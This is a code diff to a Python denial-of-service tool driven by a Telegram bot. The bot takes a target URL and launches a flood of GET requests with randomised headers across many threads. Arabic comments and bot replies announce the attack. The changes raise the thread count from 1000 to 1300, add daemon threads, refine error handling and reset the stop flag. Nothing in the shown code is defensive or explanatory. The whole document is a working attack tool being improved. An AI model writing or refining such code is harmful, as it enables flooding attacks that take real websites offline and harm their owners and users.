@@ -38,16 +38,17 @@ def send_requests(target):
             headers = get_random_headers()
             requests.get(target, headers=headers, timeout=5)
             print(Fore.GREEN + f"Request sent to {target}" + Style.RESET_ALL)
-        except Exception as e:
+        except requests.exceptions.RequestException as e:
             print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
 
-def start_attack(target, num_threads=1000):
+def start_attack(target, num_threads=1300):
     """بدء الهجوم باستخدام عدد من الخيوط."""
     global stop_attack_flag
     stop_attack_flag = False
 
     for _ in range(num_threads):
         thread = threading.Thread(target=send_requests, args=(target,))
+        thread.daemon = True  # يجعل الخيط يتوقف عند توقف البرنامج الرئيسي
         thread.start()
 
 # إعداد telebot
@@ -61,12 +62,14 @@ def handle_start(message):
 
 def handle_target(message):
     """معالجة الرابط المستهدف."""
+    global stop_attack_flag
     target = message.text
     if not target.startswith(("http://", "https://")):
         bot.reply_to(message, "الرابط غير صالح. يرجى إرسال رابط يبدأ بـ http:// أو https://")
         return
 
     bot.reply_to(message, f"بدأ الهجوم على {target}...")
+    stop_attack_flag = False  # تأكد من إعادة تعيين العلم
     start_attack(target)
 
 @bot.message_handler(commands=['stop'])
